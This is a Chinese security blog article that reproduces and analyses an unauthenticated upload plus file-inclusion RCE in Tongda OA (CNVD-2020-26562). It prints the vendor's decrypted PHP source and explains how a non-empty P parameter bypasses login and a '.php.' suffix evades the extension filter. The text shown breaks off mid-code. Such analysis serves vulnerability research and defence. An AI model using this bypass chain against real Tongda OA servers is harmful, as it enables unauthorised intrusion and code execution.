> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/Ntu5UKA2pUe7HaA9dVBYjA)

**高质量的安全文章，安全 offer 面试经验分享**

**尽在 # 掌控安全 EDU #**

  

![](https://mmbiz.qpic.cn/mmbiz_png/siayVELeBkzWBXV8e57JJ4OyQuuMXTfadZCia0bN2sFBfdbTRlFx0S97kyKKjic5v6eaZ8cY4WQt0UEu4dkyowHYg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/rl6daM2XiabyLSr7nSTyAzcoZqPAsfe5tOOrXX0aciaVAfibHeQk5NOfQTdESRsezCwstPF02LeE4RHaH6NBEB9Rw/640?wx_fmt=png)

作者：掌控安全 - master

一位向往于任意门的白帽少年, 我的奇技淫巧, 让你尽可能的 getshell.  

今天的主角通达 OA, 前段时间黑产界的杀手, 开始吧！

**0x00 漏洞简介**

CNVD:CNVD-2020-26562

通达 OA 是由北京通达信科科技有限公司开发的一款办公系统，前几天通达官方在其官网发布了安全提醒与更新程序，并披露有用户遭到攻击。

  
攻击者可在未授权的情况下可上传图片木马文件，之后通过精心构造的请求进行文件包含，实现远程命令执行，且攻击者无须登陆认证即可完成攻击。

  
![](https://mmbiz.qpic.cn/mmbiz_jpg/CBJYPapLzSGeYH4mRCThwafpMIh6mo5N23rNnULamWT6qXEZfCsnpbjwEEBujWS9fYYDmLgCAdupxYjPYV1CyA/640?wx_fmt=jpeg)  
  

本文主要以通达 OA 文件上传和文件包含导致的 RCE 进行复现和分析

通过 fofa 的搜索可以看到通达 OA 系统应用非常广泛, 这就给同学们提供了大量的实战环境. 当然大家一定要做一个正直的白帽子.

  
![](https://mmbiz.qpic.cn/mmbiz_jpg/CBJYPapLzSGeYH4mRCThwafpMIh6mo5NhypPL8YNh522Flpx3oWXB3L5AfzjIwU3fiaYMAhI0ibPR4rTrWYmChicQ/640?wx_fmt=jpeg)

0x01 影响范围
---------

1.  通达 OA V11 版 <= 11.3 20200103
    
2.  通达 OA 2017 版 <= 10.19 20190522
    
3.  通达 OA 2016 版 <= 9.13 20170710
    
4.  通达 OA 2015 版 <= 8.15 20160722
    
5.  通达 OA 2013 增强版 <= 7.25 20141211
    
6.  通达 OA 2013 版 <= 6.20 20141017
    

0x02 环境搭建
---------

通达 OA 系统采用了一键式的傻瓜操作, 正常的软件安装, 这里我本地搭建的. 安装过程省略. 安装完成后访问本地地址, 截图如下:  

![](https://mmbiz.qpic.cn/mmbiz_jpg/CBJYPapLzSGeYH4mRCThwafpMIh6mo5NChNAOibFmocz41yvMXASe18g2mzt63qUUiaQRU76ZLnbvkISBQlhFIqQ/640?wx_fmt=jpeg)  

0x03 未授权上传文件
------------

文件在 webroot\ispirit\im\upload.php

```
<?php<br style="overflow-wrap: break-word !important;"><br style="overflow-wrap: break-word !important;">set_time_limit(0);<br style="overflow-wrap: break-word !important;">$P = $_POST['P'];<br style="overflow-wrap: break-word !important;">if (isset($P) || $P != '') {<br style="overflow-wrap: break-word !important;"> ob_start();<br style="overflow-wrap: break-word !important;"> include_once 'inc/session.php';<br style="overflow-wrap: break-word !important;"> session_id($P);<br style="overflow-wrap: break-word !important;"> session_start();<br style="overflow-wrap: break-word !important;"> session_write_close();<br style="overflow-wrap: break-word !important;">} else {<br style="overflow-wrap: break-word !important;"> include_once './auth.php';<br style="overflow-wrap: break-word !important;">}<br style="overflow-wrap: break-word !important;">include_once 'inc/utility_file.php';<br style="overflow-wrap: break-word !important;">include_once 'inc/utility_msg.php';<br style="overflow-wrap: break-word !important;">include_once 'mobile/inc/funcs.php';<br style="overflow-wrap: break-word !important;">ob_end_clean();<br style="overflow-wrap: break-word !important;">$TYPE = $_POST['TYPE'];<br style="overflow-wrap: break-word !important;">$DEST_UID = $_POST['DEST_UID'];<br style="overflow-wrap: break-word !important;">$dataBack = array();<br style="overflow-wrap: break-word !important;">if ($DEST_UID != '' && !td_verify_ids($ids)) {<br style="overflow-wrap: break-word !important;"> $dataBack = array('status' => 0, 'content' => '-ERR ' . <br style="overflow-wrap: break-word !important;"> _('接收<br style="overflow-wrap: break-word !important;"> 方ID无效'));<br style="overflow-wrap: break-word !important;"> echo json_encode(data2utf8($dataBack));<br style="overflow-wrap: break-word !important;"> exit;<br style="overflow-wrap: break-word !important;">}<br style="overflow-wrap: break-word !important;">if (strpos($DEST_UID, ',') !== false) {<br style="overflow-wrap: break-word !important;">} else {<br style="overflow-wrap: break-word !important;"> $DEST_UID = intval($DEST_UID);<br style="overflow-wrap: break-word !important;">}<br style="overflow-wrap: break-word !important;">if ($DEST_UID == 0) {<br style="overflow-wrap: break-word !important;"> if ($UPLOAD_MODE != 2) {<br style="overflow-wrap: break-word !important;"> $dataBack = array('status' => 0, 'content' => '-ERR ' . <br style="overflow-wrap: break-word !important;"> _('接收方ID无效'));<br style="overflow-wrap: break-word !important;"> echo json_encode(data2utf8($dataBack));<br style="overflow-wrap: break-word !important;"> exit;<br style="overflow-wrap: break-word !important;"> }<br style="overflow-wrap: break-word !important;">}<br style="overflow-wrap: break-word !important;">$MODULE = 'im';<br style="overflow-wrap: break-word !important;">if (1 <= count($_FILES)) {<br style="overflow-wrap: break-word !important;"> if ($UPLOAD_MODE == '1') {<br style="overflow-wrap: break-word !important;"> if (strlen(urldecode($_FILES['ATTACHMENT']['name'])) != <br style="overflow-wrap: break-word !important;"> strlen($_FILES['ATTACHMENT']['name'])) {<br style="overflow-wrap: break-word !important;"> $_FILES['ATTACHMENT']['name'] = <br style="overflow-wrap: break-word !important;"> urldecode($_FILES['ATTACHMENT']['name']);<br style="overflow-wrap: break-word !important;"> }<br style="overflow-wrap: break-word !important;"> }<br style="overflow-wrap: break-word !important;"> $ATTACHMENTS = upload('ATTACHMENT', $MODULE, false);<br style="overflow-wrap: break-word !important;"> if (!is_array($ATTACHMENTS)) {<br style="overflow-wrap: break-word !important;"> $dataBack = array('status' => 0, 'content' => '-ERR ' . <br style="overflow-wrap: break-word !important;"> $ATTACHMENTS);<br style="overflow-wrap: break-word !important;"> echo json_encode(data2utf8($dataBack));<br style="overflow-wrap: break-word !important;"> exit;<br style="overflow-wrap: break-word !important;"> }<br style="overflow-wrap: break-word !important;"> ob_end_clean();<br style="overflow-wrap: break-word !important;"> $ATTACHMENT_ID = substr($ATTACHMENTS['ID'], 0, -1);<br style="overflow-wrap: break-word !important;"> $ATTACHMENT_NAME = substr($ATTACHMENTS['NAME'], 0, -1);<br style="overflow-wrap: break-word !important;"> if ($TYPE == 'mobile') {<br style="overflow-wrap: break-word !important;"> $ATTACHMENT_NAME = <br style="overflow-wrap: break-word !important;"> td_iconv(urldecode($ATTACHMENT_NAME), <br style="overflow-wrap: break-word !important;"> 'utf-8', MYOA_CHARSET);<br style="overflow-wrap: break-word !important;"> }<br style="overflow-wrap: break-word !important;">} else {<br style="overflow-wrap: break-word !important;"> $dataBack = array('status' => 0, 'content' => '-ERR ' . <br style="overflow-wrap: break-word !important;"> _('无文<br style="overflow-wrap: break-word !important;"> 件上传'));<br style="overflow-wrap: break-word !important;"> echo json_encode(data2utf8($dataBack));<br style="overflow-wrap: break-word !important;"> exit;<br style="overflow-wrap: break-word !important;">}<br style="overflow-wrap: break-word !important;">$FILE_SIZE = attach_size($ATTACHMENT_ID, $ATTACHMENT_NAME, <br style="overflow-wrap: break-word !important;">$MODULE);<br style="overflow-wrap: break-word !important;">if (!$FILE_SIZE) {<br style="overflow-wrap: break-word !important;"> $dataBack = array('status' => 0, 'content' => '-ERR ' . <br style="overflow-wrap: break-word !important;"> _('文件<br style="overflow-wrap: break-word !important;"> 上传失败'));<br style="overflow-wrap: break-word !important;"> echo json_encode(data2utf8($dataBack));<br style="overflow-wrap: break-word !important;"> exit;<br style="overflow-wrap: break-word !important;">}<br style="overflow-wrap: break-word !important;">if ($UPLOAD_MODE == '1') {<br style="overflow-wrap: break-word !important;"> if (is_thumbable($ATTACHMENT_NAME)) {<br style="overflow-wrap: break-word !important;"> $FILE_PATH = attach_real_path($ATTACHMENT_ID, <br style="overflow-wrap: break-word !important;"> $ATTACHMENT_NAME, $MODULE);<br style="overflow-wrap: break-word !important;"> $THUMB_FILE_PATH = substr($FILE_PATH, 0, <br style="overflow-wrap: break-word !important;"> strlen($FILE_PATH) - strlen($ATTACHMENT_NAME)) . <br style="overflow-wrap: break-word !important;"> 'thumb_' <br style="overflow-wrap: break-word !important;"> . $ATTACHMENT_NAME;<br style="overflow-wrap: break-word !important;"> CreateThumb($FILE_PATH, 320, 240, $THUMB_FILE_PATH);<br style="overflow-wrap: break-word !important;"> }<br style="overflow-wrap: break-word !important;"> $P_VER = is_numeric($P_VER) ? intval($P_VER) : 0;<br style="overflow-wrap: break-word !important;"> $MSG_CATE = $_POST['MSG_CATE'];<br style="overflow-wrap: break-word !important;"> if ($MSG_CATE == 'file') {<br style="overflow-wrap: break-word !important;"> $CONTENT = '[fm]' . $ATTACHMENT_ID . '|' . <br style="overflow-wrap: break-word !important;"> $ATTACHMENT_NAME . '|' . $FILE_SIZE . '[/fm]';<br style="overflow-wrap: break-word !important;"> } else {<br style="overflow-wrap: break-word !important;"> if ($MSG_CATE == 'image') {<br style="overflow-wrap: break-word !important;"> $CONTENT = '[im]' . $ATTACHMENT_ID . '|' . <br style="overflow-wrap: break-word !important;"> $ATTACHMENT_NAME . '|' . $FILE_SIZE . '[/im]';<br style="overflow-wrap: break-word !important;"> } else {<br style="overflow-wrap: break-word !important;"> $DURATION = intval($DURATION);<br style="overflow-wrap: break-word !important;"> $CONTENT = '[vm]' . $ATTACHMENT_ID . '|' . <br style="overflow-wrap: break-word !important;"> $ATTACHMENT_NAME . '|' . $DURATION . '[/vm]';<br style="overflow-wrap: break-word !important;"> }<br style="overflow-wrap: break-word !important;"> }<br style="overflow-wrap: break-word !important;"> $AID = 0;<br style="overflow-wrap: break-word !important;"> $POS = strpos($ATTACHMENT_ID, '@');<br style="overflow-wrap: break-word !important;"> if ($POS !== false) {<br style="overflow-wrap: break-word !important;"> $AID = intval(substr($ATTACHMENT_ID, 0, $POS));<br style="overflow-wrap: break-word !important;"> }<br style="overflow-wrap: break-word !important;"> $query = 'INSERT INTO im_offline_file <br style="overflow-wrap: break-word !important;"> (TIME,SRC_UID,DEST_UID,FILE_NAME,FILE_SIZE,FLAG,AID) values <br style="overflow-wrap: break-word !important;"> (\'' . date('Y-m-d H:i:s') . '\',\'' . <br style="overflow-wrap: break-word !important;"> $_SESSION['LOGIN_UID'] <br style="overflow-wrap: break-word !important;"> . '\',\'' . $DEST_UID . '\',\'*' . $ATTACHMENT_ID . '.' . <br style="overflow-wrap: break-word !important;"> $ATTACHMENT_NAME . '\',\'' . $FILE_SIZE . '\',\'0\',\'' . <br style="overflow-wrap: break-word !important;"> $AID <br style="overflow-wrap: break-word !important;"> . '\')';<br style="overflow-wrap: break-word !important;"> $cursor = exequery(TD::conn(), $query);<br style="overflow-wrap: break-word !important;"> $FILE_ID = mysql_insert_id();<br style="overflow-wrap: break-word !important;"> if ($cursor === false) {<br style="overflow-wrap: break-word !important;"> $dataBack = array('status' => 0, 'content' => '-ERR ' . <br style="overflow-wrap: break-word !important;"> _('数据库操作失败'));<br style="overflow-wrap: break-word !important;"> echo json_encode(data2utf8($dataBack));<br style="overflow-wrap: break-word !important;"> exit;<br style="overflow-wrap: break-word !important;"> }<br style="overflow-wrap: break-word !important;"> $dataBack = array('status' => 1, 'content' => $CONTENT, <br style="overflow-wrap: break-word !important;"> 'file_id' => $FILE_ID);<br style="overflow-wrap: break-word !important;"> echo json_encode(data2utf8($dataBack));<br style="overflow-wrap: break-word !important;"> exit;<br style="overflow-wrap: break-word !important;">} else {<br style="overflow-wrap: break-word !important;"> if ($UPLOAD_MODE == '2') {<br style="overflow-wrap: break-word !important;"> $DURATION = intval($_POST['DURATION']);<br style="overflow-wrap: break-word !important;"> $CONTENT = '[vm]' . $ATTACHMENT_ID . '|' . <br style="overflow-wrap: break-word !important;"> $ATTACHMENT_NAME . '|' . $DURATION . '[/vm]';<br style="overflow-wrap: break-word !important;"> $query = 'INSERT INTO WEIXUN_SHARE (UID, CONTENT, <br style="overflow-wrap: break-word !important;"> ADDTIME) <br style="overflow-wrap: break-word !important;"> VALUES (\'' . $_SESSION['LOGIN_UID'] . '\', \'' . <br style="overflow-wrap: break-word !important;"> $CONTENT <br style="overflow-wrap: break-word !important;"> . '\', \'' . time() . '\')';<br style="overflow-wrap: break-word !important;"> $cursor = exequery(TD::conn(), $query);<br style="overflow-wrap: break-word !important;"> echo '+OK ' . $CONTENT;<br style="overflow-wrap: break-word !important;"> } else {<br style="overflow-wrap: break-word !important;"> if ($UPLOAD_MODE == '3') {<br style="overflow-wrap: break-word !important;"> if (is_thumbable($ATTACHMENT_NAME)) {<br style="overflow-wrap: break-word !important;"> $FILE_PATH = attach_real_path($ATTACHMENT_ID, <br style="overflow-wrap: break-word !important;"> $ATTACHMENT_NAME, $MODULE);<br style="overflow-wrap: break-word !important;"> $THUMB_FILE_PATH = substr($FILE_PATH, 0, <br style="overflow-wrap: break-word !important;"> strlen($FILE_PATH) - strlen($ATTACHMENT_NAME)) <br style="overflow-wrap: break-word !important;"> . 'thumb_' . $ATTACHMENT_NAME;<br style="overflow-wrap: break-word !important;"> CreateThumb($FILE_PATH, 320, 240, <br style="overflow-wrap: break-word !important;"> $THUMB_FILE_PATH);<br style="overflow-wrap: break-word !important;"> }<br style="overflow-wrap: break-word !important;"> echo '+OK ' . $ATTACHMENT_ID;<br style="overflow-wrap: break-word !important;"> } else {<br style="overflow-wrap: break-word !important;"> $CONTENT = '[fm]' . $ATTACHMENT_ID . '|' . <br style="overflow-wrap: break-word !important;"> $ATTACHMENT_NAME . '|' . $FILE_SIZE . '[/fm]';<br style="overflow-wrap: break-word !important;"> $msg_id = send_msg($_SESSION['LOGIN_UID'], <br style="overflow-wrap: break-word !important;"> $DEST_UID, <br style="overflow-wrap: break-word !important;"> 1, $CONTENT, '', 2);<br style="overflow-wrap: break-word !important;"> $query = 'insert into IM_OFFLINE_FILE <br style="overflow-wrap: break-word !important;"> (TIME,SRC_UID,DEST_UID,FILE_NAME,FILE_SIZE,FLAG) <br style="overflow-wrap: break-word !important;"> values (\'' . date('Y-m-d H:i:s') . '\',\'' . <br style="overflow-wrap: break-word !important;"> $_SESSION['LOGIN_UID'] . '\',\'' . $DEST_UID . <br style="overflow-wrap: break-word !important;"> '\',\'*' . $ATTACHMENT_ID . '.' . $ATTACHMENT_NAME <br style="overflow-wrap: break-word !important;"> . '\',\'' . $FILE_SIZE . '\',\'0\')';<br style="overflow-wrap: break-word !important;"> $cursor = exequery(TD::conn(), $query);<br style="overflow-wrap: break-word !important;"> $FILE_ID = mysql_insert_id();<br style="overflow-wrap: break-word !important;"> if ($cursor === false) {<br style="overflow-wrap: break-word !important;"> echo '-ERR ' . _('数据库操作失败');<br style="overflow-wrap: break-word !important;"> exit;<br style="overflow-wrap: break-word !important;"> }<br style="overflow-wrap: break-word !important;"> if ($FILE_ID == 0) {<br style="overflow-wrap: break-word !important;"> echo '-ERR ' . _('数据库操作失败2');<br style="overflow-wrap: break-word !important;"> exit;<br style="overflow-wrap: break-word !important;"> }<br style="overflow-wrap: break-word !important;"> echo '+OK ,' . $FILE_ID . ',' . $msg_id;<br style="overflow-wrap: break-word !important;"> exit;<br style="overflow-wrap: break-word !important;"> }<br style="overflow-wrap: break-word !important;"> }<br style="overflow-wrap: break-word !important;">}<br style="overflow-wrap: break-word !important;">
```

源码采用了 zend 加密，解密后才能正常阅读代码，上面的代码是解密后的，如果有想去探索更多的可以用解密工具解密自行研究。

通过上边的源码可以看到，第一个 if(第 5 行) 对 P 进行了判断，只要传递了参数 P 或者不为空，就可以进入下面的语句，如果判断失败，就进入 else，也就是身份认证功能

所以这里只需要传递一个 P 并且值不为空，就可以绕过登录认证，在未授权的情况下进行上传文件。

  
![](https://mmbiz.qpic.cn/mmbiz_jpg/CBJYPapLzSGeYH4mRCThwafpMIh6mo5N8bzlcPPPAcOtxMuxZuTmPlgLILHicoUuibQ0UahOsKibow9H4ibfI2rgQg/640?wx_fmt=jpeg)  
  

这里测试的包中传递了 P 参数

接着往下看

  
![](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSGeYH4mRCThwafpMIh6mo5NdunXW9Yuld8Iuhq1fp1MGFCqgEicYSGuq4Bomy0oWticMR0dP6ic6jpPw/640?wx_fmt=png)  
  

判断 DEST_UID, 只要不为空也不为 0 即可， 在之后的文件上传处理逻辑代码中，

会对 $_FILES[‘ATTACHMENT’][‘name’]) 进行一次 url 解码，

之后判断解码前后文件名长度是否有变化

如果有变化，则将 url 解码后的文件名作为最后的文件名。

之后追踪 upload 函数，在 inc/utility_file.php 的 1321 行

```
function upload($PREFIX = 'ATTACHMENT', $MODULE = '', $OUTPUT = <br style="overflow-wrap: break-word !important;">true)<br style="overflow-wrap: break-word !important;">{<br style="overflow-wrap: break-word !important;"> if (strstr($MODULE, '/') || strstr($MODULE, '\\')) {<br style="overflow-wrap: break-word !important;"> if (!$OUTPUT) {<br style="overflow-wrap: break-word !important;"> return _('参数含有非法字符。');<br style="overflow-wrap: break-word !important;"> }<br style="overflow-wrap: break-word !important;"> Message(_('错误'), _('参数含有非法字符。'));<br style="overflow-wrap: break-word !important;"> exit;<br style="overflow-wrap: break-word !important;"> }<br style="overflow-wrap: break-word !important;"> $ATTACHMENTS = array('ID' => '', 'NAME' => '');<br style="overflow-wrap: break-word !important;"> reset($_FILES);<br style="overflow-wrap: break-word !important;"> foreach ($_FILES as $KEY => $ATTACHMENT) {<br style="overflow-wrap: break-word !important;"> if ($ATTACHMENT['error'] == 4 || $KEY != $PREFIX && <br style="overflow-wrap: break-word !important;"> substr($KEY, 0, strlen($PREFIX) + 1) != $PREFIX . '_') <br style="overflow-wrap: break-word !important;"> {<br style="overflow-wrap: break-word !important;"> continue;<br style="overflow-wrap: break-word !important;"> }<br style="overflow-wrap: break-word !important;"> $data_charset = isset($_GET['data_charset']) ?<br style="overflow-wrap: break-word !important;"> $_GET['data_charset'] : (isset($_POST['data_charset'])?<br style="overflow-wrap: break-word !important;"> $_POST['data_charset'] : '');<br style="overflow-wrap: break-word !important;"> $ATTACH_NAME = $data_charset != ''? <br style="overflow-wrap: break-word !important;"> td_iconv($ATTACHMENT['name'], $data_charset, <br style="overflow-wrap: break-word !important;"> MYOA_CHARSET) : $ATTACHMENT['name'];<br style="overflow-wrap: break-word !important;"> $ATTACH_SIZE = $ATTACHMENT['size'];<br style="overflow-wrap: break-word !important;"> $ATTACH_ERROR = $ATTACHMENT['error'];<br style="overflow-wrap: break-word !important;"> $ATTACH_FILE = $ATTACHMENT['tmp_name'];<br style="overflow-wrap: break-word !important;"> $ERROR_DESC = '';<br style="overflow-wrap: break-word !important;"> if ($ATTACH_ERROR == UPLOAD_ERR_OK) {<br style="overflow-wrap: break-word !important;"> if (!is_uploadable($ATTACH_NAME)) {<br style="overflow-wrap: break-word !important;"> $ERROR_DESC = sprintf(_('禁止上传后缀名为[%s]的文<br style="overflow-wrap: break-word !important;"> 件'), substr($ATTACH_NAME, <br style="overflow-wrap: break-word !important;"> strrpos($ATTACH_NAME, '.') + 1));<br style="overflow-wrap: break-word !important;"> }<br style="overflow-wrap: break-word !important;"> $encode = mb_detect_encoding($ATTACH_NAME, <br style="overflow-wrap: break-word !important;"> array('ASCII', 'UTF-8', 'GB2312', 'GBK', 'BIG5'));<br style="overflow-wrap: break-word !important;"> if ($encode != 'UTF-8') {<br style="overflow-wrap: break-word !important;"> $ATTACH_NAME_UTF8 = <br style="overflow-wrap: break-word !important;"> mb_convert_encoding($ATTACH_NAME, 'utf-8', <br style="overflow-wrap: break-word !important;"> MYOA_CHARSET);<br style="overflow-wrap: break-word !important;"> } else {<br style="overflow-wrap: break-word !important;"> $ATTACH_NAME_UTF8 = $ATTACH_NAME;<br style="overflow-wrap: break-word !important;"> }<br style="overflow-wrap: break-word !important;"> if (preg_match('/[\\\':<>?]|\\/|\\\\|"|\\|/u', <br style="overflow-wrap: break-word !important;"> $ATTACH_NAME_UTF8)) {<br style="overflow-wrap: break-word !important;"> $ERROR_DESC = sprintf(_('文件名[%s]包含<br style="overflow-wrap: break-word !important;"> [/\\\'":*?<>|]等非法字符'), $ATTACH_NAME);<br style="overflow-wrap: break-word !important;"> }<br style="overflow-wrap: break-word !important;"> if ($ATTACH_SIZE == 0) {<br style="overflow-wrap: break-word !important;"> $ERROR_DESC = sprintf(_('文件[%s]大小为0字节'), <br style="overflow-wrap: break-word !important;"> $ATTACH_NAME);<br style="overflow-wrap: break-word !important;"> }<br style="overflow-wrap: break-word !important;"> if ($ERROR_DESC == '') {<br style="overflow-wrap: break-word !important;"> $ATTACH_NAME = str_replace('\'', '', <br style="overflow-wrap: break-word !important;"> $ATTACH_NAME);<br style="overflow-wrap: break-word !important;"> $ATTACH_ID = add_attach($ATTACH_FILE, <br style="overflow-wrap: break-word !important;"> $ATTACH_NAME, $MODULE);<br style="overflow-wrap: break-word !important;"> if ($ATTACH_ID === false) {<br style="overflow-wrap: break-word !important;"> $ERROR_DESC = sprintf(_('文件[%s]上传失败'), <br style="overflow-wrap: break-word !important;"> $ATTACH_NAME);<br style="overflow-wrap: break-word !important;"> } else {<br style="overflow-wrap: break-word !important;"> $ATTACHMENTS['ID'] .= $ATTACH_ID . ',';<br style="overflow-wrap: break-word !important;"> $ATTACHMENTS['NAME'] .= $ATTACH_NAME . '*';<br style="overflow-wrap: break-word !important;"> }<br style="overflow-wrap: break-word !important;"> }<br style="overflow-wrap: break-word !important;"> @unlink($ATTACH_FILE);<br style="overflow-wrap: break-word !important;"> } else {<br style="overflow-wrap: break-word !important;"> if ($ATTACH_ERROR == UPLOAD_ERR_INI_SIZE) {<br style="overflow-wrap: break-word !important;"> $ERROR_DESC = sprintf(_('文件[%s]的大小超过了系统<br style="overflow-wrap: break-word !important;"> 限制<br style="overflow-wrap: break-word !important;">（%s）'), $ATTACH_NAME, ini_get('upload_max_filesize'));<br style="overflow-wrap: break-word !important;"> } else {<br style="overflow-wrap: break-word !important;"> if ($ATTACH_ERROR == UPLOAD_ERR_FORM_SIZE) {<br style="overflow-wrap: break-word !important;"> $ERROR_DESC = sprintf(_('文件[%s]的大小超过<br style="overflow-wrap: break-word !important;"> 了表<br style="overflow-wrap: break-word !important;">单限制'), $ATTACH_NAME);<br style="overflow-wrap: break-word !important;"> } else {<br style="overflow-wrap: break-word !important;"> if ($ATTACH_ERROR == UPLOAD_ERR_PARTIAL) {<br style="overflow-wrap: break-word !important;"> $ERROR_DESC = sprintf(_('文件[%s]上传不<br style="overflow-wrap: break-word !important;"> 完整'), $ATTACH_NAME);<br style="overflow-wrap: break-word !important;"> } else {<br style="overflow-wrap: break-word !important;"> if ($ATTACH_ERROR == <br style="overflow-wrap: break-word !important;"> UPLOAD_ERR_NO_TMP_DIR) {<br style="overflow-wrap: break-word !important;"> $ERROR_DESC = sprintf(_('文件[%s]上<br style="overflow-wrap: break-word !important;"> 传失败：找不到临时文件夹'), <br style="overflow-wrap: break-word !important;"> $ATTACH_NAME);<br style="overflow-wrap: break-word !important;"> } else {<br style="overflow-wrap: break-word !important;"> if ($ATTACH_ERROR == U<br style="overflow-wrap: break-word !important;"> PLOAD_ERR_CANT_WRITE) {<br style="overflow-wrap: break-word !important;"> $ERROR_DESC = sprintf(_('文件<br style="overflow-wrap: break-word !important;"> [%s]写入失败'), $ATTACH_NAME);<br style="overflow-wrap: break-word !important;"> } else {<br style="overflow-wrap: break-word !important;"> $ERROR_DESC = sprintf(_('未知错<br style="overflow-wrap: break-word !important;"> 误[代码：%s]'), $ATTACH_ERROR);<br style="overflow-wrap: break-word !important;"> }<br style="overflow-wrap: break-word !important;"> }<br style="overflow-wrap: break-word !important;"> }<br style="overflow-wrap: break-word !important;"> }<br style="overflow-wrap: break-word !important;"> }<br style="overflow-wrap: break-word !important;"> }<br style="overflow-wrap: break-word !important;"> if ($ERROR_DESC != '') {<br style="overflow-wrap: break-word !important;"> if (!$OUTPUT) {<br style="overflow-wrap: break-word !important;"> delete_attach($ATTACHMENTS['ID'], <br style="overflow-wrap: break-word !important;"> $ATTACHMENTS['NAME'], $MODULE);<br style="overflow-wrap: break-word !important;"> return $ERROR_DESC;<br style="overflow-wrap: break-word !important;"> } else {<br style="overflow-wrap: break-word !important;"> Message(_('错误'), $ERROR_DESC);<br style="overflow-wrap: break-word !important;"> }<br style="overflow-wrap: break-word !important;"> }<br style="overflow-wrap: break-word !important;"> }<br style="overflow-wrap: break-word !important;"> return $ATTACHMENTS;<br style="overflow-wrap: break-word !important;">}<br style="overflow-wrap: break-word !important;">
```

![](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSGeYH4mRCThwafpMIh6mo5N3nYaibnzXsvvDrzFhBUT3SeuZBY1myNKuH4t4kWmhicIIuAPfwcbEKzA/640?wx_fmt=png)

这里调用了 is_uploadable 对文件名字进行判断, 这个函数在 1833 行

```
function is_uploadable($FILE_NAME)<br style="overflow-wrap: break-word !important;">{<br style="overflow-wrap: break-word !important;"> $POS = strrpos($FILE_NAME, '.');<br style="overflow-wrap: break-word !important;"> if ($POS === false) {<br style="overflow-wrap: break-word !important;"> $EXT_NAME = $FILE_NAME;<br style="overflow-wrap: break-word !important;"> } else {<br style="overflow-wrap: break-word !important;"> if (strtolower(substr($FILE_NAME, $POS + 1, 3)) == <br style="overflow-wrap: break-word !important;"> 'php') {<br style="overflow-wrap: break-word !important;"> return false;<br style="overflow-wrap: break-word !important;"> }<br style="overflow-wrap: break-word !important;"> $EXT_NAME = strtolower(substr($FILE_NAME, $POS + 1));<br style="overflow-wrap: break-word !important;"> }<br style="overflow-wrap: break-word !important;"> if (find_id(MYOA_UPLOAD_FORBIDDEN_TYPE, $EXT_NAME)) {<br style="overflow-wrap: break-word !important;"> return false;<br style="overflow-wrap: break-word !important;"> }<br style="overflow-wrap: break-word !important;"> if (MYOA_UPLOAD_LIMIT == 0) {<br style="overflow-wrap: break-word !important;"> return true;<br style="overflow-wrap: break-word !important;"> } else {<br style="overflow-wrap: break-word !important;"> if (MYOA_UPLOAD_LIMIT == 1) {<br style="overflow-wrap: break-word !important;"> return !find_id(MYOA_UPLOAD_LIMIT_TYPE, $EXT_NAME);<br style="overflow-wrap: break-word !important;"> } else {<br style="overflow-wrap: break-word !important;"> if (MYOA_UPLOAD_LIMIT == 2) {<br style="overflow-wrap: break-word !important;"> return find_id(MYOA_UPLOAD_LIMIT_TYPE, <br style="overflow-wrap: break-word !important;"> $EXT_NAME);<br style="overflow-wrap: break-word !important;"> } else {<br style="overflow-wrap: break-word !important;"> return false;<br style="overflow-wrap: break-word !important;"> }<br style="overflow-wrap: break-word !important;"> }<br style="overflow-wrap: break-word !important;"> }<br style="overflow-wrap: break-word !important;">}<br style="overflow-wrap: break-word !important;">
```

首先使用了 strrpos 来定位 . 最后出现的位置

  
![](https://mmbiz.qpic.cn/mmbiz_jpg/CBJYPapLzSGeYH4mRCThwafpMIh6mo5NaiaibxH5N8SzahxofeCKqDcLLtgqHHsvtl6sGYhjwP3nKyZp73pKN4pg/640?wx_fmt=jpeg)  
  

当文件名中不存在”.” 时会直接以现有的文件名来作为 EXT_NAME,

**如果存在则从. 开始匹配 3 位，判断后缀是否为 php,**

**如果为 php 则返回 false, 否则将”.” 之前的作为 EXT_NAME。**

因为通达 OA 搭建在 windows 环境下，所以可以上传一个. php. 后缀的文件，来绕过文件检测 (这里跟文件上传的绕过原理相同）

但是这里问题是上传的文件不在 web 工作目录下，所以即使上传了也访问不到，

所以无法利用，**下边我们就要用到文件包含的漏洞执行我们上传的文件！**

0x04 文件包含
---------

这个关键文件的位置在 webroot\ispirit\interface\gateway.php  

（这里仅参考我用的版本，不同的版本好像路径不同，还有待研究），话不多说，看源码：

```
<?php<br style="overflow-wrap: break-word !important;">ob_start();<br style="overflow-wrap: break-word !important;">include_once 'inc/session.php';<br style="overflow-wrap: break-word !important;">include_once 'inc/conn.php';<br style="overflow-wrap: break-word !important;">include_once 'inc/utility_org.php';<br style="overflow-wrap: break-word !important;">if ($P != '') {<br style="overflow-wrap: break-word !important;"> if (preg_match('/[^a-z0-9;]+/i', $P)) {<br style="overflow-wrap: break-word !important;"> echo _('非法参数');<br style="overflow-wrap: break-word !important;"> exit;<br style="overflow-wrap: break-word !important;"> }<br style="overflow-wrap: break-word !important;"> session_id($P);<br style="overflow-wrap: break-word !important;"> session_start();<br style="overflow-wrap: break-word !important;"> session_write_close();<br style="overflow-wrap: break-word !important;"> if ($_SESSION['LOGIN_USER_ID'] == '' || <br style="overflow-wrap: break-word !important;"> $_SESSION['LOGIN_UID'] == '') {<br style="overflow-wrap: break-word !important;"> echo _('RELOGIN');<br style="overflow-wrap: break-word !important;"> exit;<br style="overflow-wrap: break-word !important;"> }<br style="overflow-wrap: break-word !important;">}<br style="overflow-wrap: break-word !important;">if ($json) {<br style="overflow-wrap: break-word !important;"> $json = stripcslashes($json);<br style="overflow-wrap: break-word !important;"> $json = (array) json_decode($json);<br style="overflow-wrap: break-word !important;"> foreach ($json as $key => $val) {<br style="overflow-wrap: break-word !important;"> if ($key == 'data') {<br style="overflow-wrap: break-word !important;"> $val = (array) $val;<br style="overflow-wrap: break-word !important;"> foreach ($val as $keys => $value) {<br style="overflow-wrap: break-word !important;"> ${$keys} = $value;<br style="overflow-wrap: break-word !important;"> }<br style="overflow-wrap: break-word !important;"> }<br style="overflow-wrap: break-word !important;"> if ($key == 'url') {<br style="overflow-wrap: break-word !important;"> $url = $val;<br style="overflow-wrap: break-word !important;"> }<br style="overflow-wrap: break-word !important;"> }<br 